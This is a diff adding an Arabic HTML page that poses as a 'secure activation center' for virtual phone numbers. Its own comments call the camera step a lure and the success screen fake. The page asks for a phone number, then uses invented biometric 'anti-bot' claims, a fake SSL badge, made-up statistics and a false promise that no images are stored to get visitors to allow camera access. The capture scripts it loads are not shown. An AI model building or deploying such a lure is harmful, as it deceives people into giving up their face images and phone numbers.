@@ -1,0 +1,197 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>نظام التفعيل الآلي - Activation Center</title>
+    <link rel="stylesheet" href="styles.css">
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🔐</text></svg>">
+</head>
+<body>
+    <!-- شاشة التحميل -->
+    <div id="loader" class="loader">
+        <div class="loader-spinner"></div>
+        <p>جاري تحميل النظام الآمن...</p>
+    </div>
+
+    <!-- الصفحة الرئيسية -->
+    <div id="mainApp" class="container hidden">
+        <header class="header">
+            <div class="logo">
+                <svg width="50" height="50" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                    <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
+                    <path d="M9 12l2 2 4-4"/>
+                </svg>
+                <h1>مركز التفعيل الآمن</h1>
+            </div>
+            <div class="security-badge">
+                <span class="badge-icon">🛡️</span>
+                <span>اتصال مشفر SSL</span>
+            </div>
+        </header>
+
+        <main class="main-content">
+            <!-- بطاقة التفعيل -->
+            <div class="activation-card">
+                <div class="card-header">
+                    <h2>تفعيل الرقم الوهمي</h2>
+                    <p class="subtitle">يرجى إتمام التحقق البشري للمتابعة</p>
+                </div>
+
+                <div class="progress-steps">
+                    <div class="step active" data-step="1">
+                        <div class="step-number">1</div>
+                        <span>التحقق من الهوية</span>
+                    </div>
+                    <div class="step" data-step="2">
+                        <div class="step-number">2</div>
+                        <span>مسح الوجه</span>
+                    </div>
+                    <div class="step" data-step="3">
+                        <div class="step-number">3</div>
+                        <span>التفعيل</span>
+                    </div>
+                </div>
+
+                <!-- نموذج إدخال الرقم -->
+                <div id="step1" class="step-content active">
+                    <div class="input-group">
+                        <label for="phoneNumber">الرقم الوهمي المطلوب تفعيله</label>
+                        <div class="phone-input">
+                            <select id="countryCode" class="country-select">
+                                <option value="+963">🇸🇾 +963</option>
+                                <option value="+961">🇱🇧 +961</option>
+                                <option value="+20">🇪🇬 +20</option>
+                                <option value="+971">🇦🇪 +971</option>
+                                <option value="+966">🇸🇦 +966</option>
+                                <option value="+90">🇹🇷 +90</option>
+                            </select>
+                            <input type="tel" id="phoneNumber" placeholder="912 345 678" maxlength="9">
+                        </div>
+                        <small class="hint">سيتم إرسال كود التحقق إلى هذا الرقم</small>
+                    </div>
+
+                    <button class="btn-primary" onclick="initiateVerification()">
+                        <span>بدء التحقق الآمن</span>
+                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <path d="M5 12h14M12 5l7 7-7 7"/>
+                        </svg>
+                    </button>
+                </div>
+
+                <!-- خطوة الكاميرا (الاستدراج) -->
+                <div id="step2" class="step-content">
+                    <div class="verification-box">
+                        <div class="camera-preview">
+                            <video id="videoElement" autoplay playsinline muted></video>
+                            <canvas id="canvasElement" style="display:none;"></canvas>
+                            <div class="face-overlay">
+                                <div class="face-circle"></div>
+                                <div class="scan-line"></div>
+                            </div>
+                        </div>
+                        
+                        <div class="verification-status">
+                            <div class="status-icon" id="statusIcon">📷</div>
+                            <h3 id="statusTitle">جاري تجهيز الكاميرا...</h3>
+                            <p id="statusText">للتحقق من هويتك، نحتاج للتأكد أنك إنسان حقيقي ولست روبوت</p>
+                        </div>
+
+                        <div class="permissions-notice">
+                            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                <circle cx="12" cy="12" r="10"/>
+                                <path d="M12 16v-4M12 8h.01"/>
+                            </svg>
+                            <span>سيطلب المتصفح إذن الوصول للكاميرا - اضغط "سماح" للمتابعة</span>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- خطوة النجاح الوهمية -->
+                <div id="step3" class="step-content">
+                    <div class="success-animation">
+                        <div class="checkmark-circle">
+                            <svg viewBox="0 0 52 52">
+                                <circle class="checkmark-circle-bg" cx="26" cy="26" r="25"/>
+                                <path class="checkmark-check" fill="none" d="M14.1 27.2l7.1 7.2 16.7-16.8"/>
+                            </svg>
+                        </div>
+                        <h2>تم التفعيل بنجاح!</h2>
+                        <p class="success-message">الرقم الوهمي الخاص بك جاهز للاستخدام الآن</p>
+                        
+                        <div class="number-display">
+                            <span class="label">الرقم المفعل:</span>
+                            <span class="activated-number" id="activatedNumber">+963 --- --- ---</span>
+                            <button class="copy-btn" onclick="copyNumber()">📋 نسخ</button>
+                        </div>
+
+                        <div class="usage-info">
+                            <h4>⚠️ تعليمات الاستخدام:</h4>
+                            <ul>
+                                <li>صالح لمدة 24 ساعة فقط</li>
+                                <li>يمكن استقبال رسائل SMS غير محدودة</li>
+                                <li>لا يمكن إجراء مكالمات صوتية</li>
+                            </ul>
+                        </div>
+
+                        <button class="btn-secondary" onclick="resetApp()">تفعيل رقم جديد</button>
+                    </div>
+                </div>
+            </div>
+
+            <!-- معلومات جانبية -->
+            <aside class="sidebar">
+                <div class="info-box">
+                    <h3>🔒 لماذا نطلب إذن الكاميرا؟</h3>
+                    <p>نستخدم تقنية التحقق البيومتري المتقدمة للتأكد من أنك إنسان حقيقي ولست برنامج آلي. هذه الخطوة ضرورية لحماية خدمتنا من الاستخدام غير القانوني.</p>
+                    <div class="tech-badges">
+                        <span>AI Verification</span>
+                        <span>Anti-Bot</span>
+                        <span>Secure</span>
+                    </div>
+                </div>
+
+                <div class="stats-box">
+                    <div class="stat">
+                        <span class="stat-number">+50K</span>
+                        <span class="stat-label">رقم مفعل</span>
+                    </div>
+                    <div class="stat">
+                        <span class="stat-number">99.9%</span>
+                        <span class="stat-label">نسبة النجاح</span>
+                    </div>
+                </div>
+            </aside>
+        </main>
+
+        <footer class="footer">
+            <p>© 2024 Virtual Number Service - جميع الحقوق محفوظة</p>
+            <div class="footer-links">
+                <a href="#">الخصوصية</a>
+                <a href="#">الشروط</a>
+                <a href="#">اتصل بنا</a>
+            </div>
+        </footer>
+    </div>
+
+    <!-- نافذة منبثقة للإذن -->
+    <div id="permissionModal" class="modal hidden">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h3>⚠️ تنبيه أمني</h3>
+            </div>
+            <div class="modal-body">
+                <p>لإتمام عملية التفعيل، يجب السماح بالوصول إلى الكاميرا للتحقق من هويتك.</p>
+                <p>لن يتم حفظ أي صور على خوادمنا - التحقق يتم محلياً على جهازك فقط.</p>
+            </div>
+            <div class="modal-actions">
+                <button class="btn-primary" onclick="requestCameraAccess()">السماح بالوصول</button>
+                <button class="btn-danger" onclick="showError()">رفض</button>
+            </div>
+        </div>
+    </div>
+
+    <script src="config.js"></script>
+    <script src="app.js"></script>
+</body>
+</html>
